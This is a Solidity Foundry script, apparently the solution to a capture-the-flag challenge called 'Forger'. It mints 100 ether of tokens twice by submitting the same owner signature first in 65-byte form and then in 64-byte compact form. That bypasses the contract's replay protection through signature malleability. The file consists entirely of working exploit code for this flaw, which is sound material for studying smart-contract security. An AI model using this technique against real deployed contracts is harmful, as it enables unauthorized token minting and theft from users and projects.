// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {Forger} from "../../src/challenge-39-forger/Forger.sol";

contract SolveForgerScript is Script {
    address constant RECEIVER = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
    uint256 constant AMOUNT = 100 ether;
    bytes32 constant SALT = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
    uint256 constant DEADLINE = type(uint256).max;

    bytes constant SIG_65 =
        hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c";

    bytes constant SIG_64 =
        hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809c02f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb";

    function run() external {
        address forgerAddress = vm.envAddress("FORGER");

        Forger forger = Forger(forgerAddress);

        vm.startBroadcast();

        forger.createNewTokensFromOwnerSignature(SIG_65, RECEIVER, AMOUNT, SALT, DEADLINE);
        forger.createNewTokensFromOwnerSignature(SIG_64, RECEIVER, AMOUNT, SALT, DEADLINE);

        vm.stopBroadcast();

        console.log("Forger:", forgerAddress);
        console.log("Total supply:", forger.totalSupply());
    }
}